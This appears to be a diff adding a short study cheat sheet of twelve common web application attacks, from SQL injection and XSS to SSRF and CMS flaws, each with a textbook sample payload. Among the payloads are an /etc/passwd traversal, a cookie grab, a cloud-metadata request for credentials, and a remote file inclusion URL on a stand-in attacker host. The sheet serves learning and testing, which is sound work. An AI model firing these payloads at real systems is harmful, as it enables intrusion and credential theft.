@@ -1,0 +1,159 @@
+WEB APPLICATION VULNERABILITIES & ATTACKS
+========================================
+1. SQL INJECTION (SQLi)
+----------------------------------------
+Description:
+SQL Injection allows an attacker to interfere with the queries
+an application makes to its database.
+Common Payload:
+' OR 1=1 --
+Payload Description:
+This payload forces the SQL query condition to always evaluate
+to TRUE, potentially bypassing authentication.
+----------------------------------------
+2. CROSS-SITE SCRIPTING (XSS)
+----------------------------------------
+Description:
+XSS allows attackers to inject malicious JavaScript into a
+victim's browser.
+Payload:
+<script>alert(1)</script>
+Payload Description:
+Executes JavaScript in the victim's browser. Can be used to
+steal cookies or session tokens.
+Types:
+- Reflected XSS
+- Stored XSS
+- DOM-based XSS
+----------------------------------------
+3. CROSS-DOMAIN SCRIPTING
+----------------------------------------
+Description:
+Occurs when improper CORS configuration allows attackers to
+access restricted resources from another domain.
+Example:
+Access-Control-Allow-Origin: *
+Payload Description:
+If CORS is misconfigured, an attacker’s domain can send
+authenticated requests and read sensitive responses.
+----------------------------------------
+4. LOCAL FILE INCLUSION (LFI)
+----------------------------------------
+Description:
+LFI allows attackers to include local server files through
+vulnerable input fields.
+Payload:
+../../../../etc/passwd
+Payload Description:
+Traverses directories to access sensitive files on the server.
+Impact:
+- Read system files
+- Log poisoning
+- Possible RCE (with chaining)
+----------------------------------------
+5. REMOTE FILE INCLUSION (RFI)
+----------------------------------------
+Description:
+RFI allows attackers to include remote malicious files.
+Payload:
+http://attacker.com/shell.txt
+Payload Description:
+The application loads and executes remote malicious code
+hosted by the attacker.
+Impact:
+- Remote Code Execution
+- Full server compromise
+----------------------------------------
+6. BRUTE FORCE ATTACK
+----------------------------------------
+Description:
+Attempts multiple username/password combinations to gain access.
+Tools:
+- Hydra
+- Burp Intruder
+Payload Description:
+Automated login attempts using wordlists to guess valid credentials.
+Impact:
+- Account takeover
+- Unauthorized access
+----------------------------------------
+7. USER ENUMERATION
+----------------------------------------
+Description:
+Occurs when an application reveals whether a username exists.
+Example:
+"User not found" vs "Incorrect password"
+Payload Description:
+Attackers test usernames and analyze response differences to
+identify valid accounts.
+Impact:
+- Targeted brute force attacks
+- Account harvesting
+----------------------------------------
+8. SESSION HIJACKING
+----------------------------------------
+Description:
+Attacker steals a valid user session ID to impersonate the victim.
+Methods:
+- XSS stealing cookies
+- Packet sniffing
+- Session fixation
+Payload Example (XSS):
+document.cookie
+Payload Description:
+Extracts session cookies which can then be reused to
+authenticate as the victim.
+Impact:
+- Full account takeover
+----------------------------------------
+9. CSRF (Cross-Site Request Forgery)
+----------------------------------------
+Description:
+Forces a victim’s browser to perform unwanted actions.
+Example:
+Hidden malicious form auto-submission
+Payload Description:
+Sends authenticated requests without the victim’s knowledge.
+Impact:
+- Password change
+- Fund transfer
+- Data modification
+----------------------------------------
+10. SSRF (Server-Side Request Forgery)
+----------------------------------------
+Description:
+Forces the server to make internal requests.
+Payload:
+http://169.254.169.254/latest/meta-data/
+Payload Description:
+Attempts to access cloud metadata service to extract credentials.
+Impact:
+- Cloud credential theft
+- Internal network access
+----------------------------------------
+11. PATH TRAVERSAL
+----------------------------------------
+Description:
+Allows access to restricted directories outside the web root.
+Payload:
+../../../../windows/win.ini
+Payload Description:
+Moves up directory structure to read sensitive files.
+----------------------------------------
+12. CMS VULNERABILITIES
+----------------------------------------
+Description:
+Content Management Systems (WordPress, Joomla, Drupal)
+often have plugin/theme vulnerabilities.
+Common Issues:
+- Outdated plugins
+- Default credentials
+- File upload bypass
+- SQL injection in plugins
+Payload Description:
+Exploits known CVEs or misconfigurations in CMS components
+to gain unauthorized access.
+Impact:
+- Admin panel compromise
+- Web shell upload
+- Full website takeover
